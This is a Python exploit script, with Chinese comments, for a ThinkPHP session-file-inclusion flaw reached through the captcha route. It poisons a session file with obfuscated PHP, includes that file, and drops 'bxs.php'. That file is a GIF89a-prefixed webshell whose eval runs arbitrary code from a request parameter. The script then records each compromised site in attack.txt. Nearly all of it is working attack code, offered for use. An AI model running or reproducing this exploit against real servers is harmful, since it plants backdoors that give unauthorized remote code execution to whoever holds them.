import requests
import urllib3
# 复现成功
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check(url):
    print(f"[info] {url}-session_inclde漏洞")
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Cookie": "PHPSESSID=zkj4alqbyfkez2i3l9erwqlkq",
        "Content-type":"application/x-www-form-urlencoded",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }
    data1 = r'_method=__construct&filter[]=think\Session::set&method=get&get[]=%3C%3Fphp+%24a%3D%27file_put_contents%27%3B%24b%3D%27base64_decode%27%3B%24a%28%24b%28%27YnhzLnBocA%3D%3D%27%29%2C%24b%28%27R2lmODlhPD9waHAgY2xhc3MgR1lVSjlnN2wgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEg3elgzKXsgQGV2YWwoIi8qWjdDYzR1cldWOSovIi4kSDd6WDMuIi8qWjdDYzR1cldWOSovIik7IH19bmV3IEdZVUo5ZzdsKCRfUkVRVUVTVFsnNGs0ZDY2NiddKTs%2FPg%3D%3D%27%29%29%3B%3F%3E&server[]=1'
    data2 = r'_method=__construct&method=GET&filter[]=think\__include_file&get[]=/tmp/sess_zkj4alqbyfkez2i3l9erwqlkq&server[]=1'
    try:
     
        requests.post(url=fr"{url}/index.php?s=captcha",data=data1,timeout=5,headers=headers,verify=False)
        requests.post(url=fr"{url}/index.php?s=captcha",data=data2,timeout=5,headers=headers,verify=False)
        res = requests.post(url=f"{url}/bxs.php",headers=headers,verify=False,timeout=5)
        if "Gif89a" in res.text :
            print(f"---->[session_inclde] 上传成功，请检查：{url}/bxs.php")
            with open("attack.txt",'a') as attack:
                attack.write(f"shell:{url}/bxs.php,session_inclde\n")
            
    except:
        print(f"[error] {url}-session_inclde漏洞")
    pass
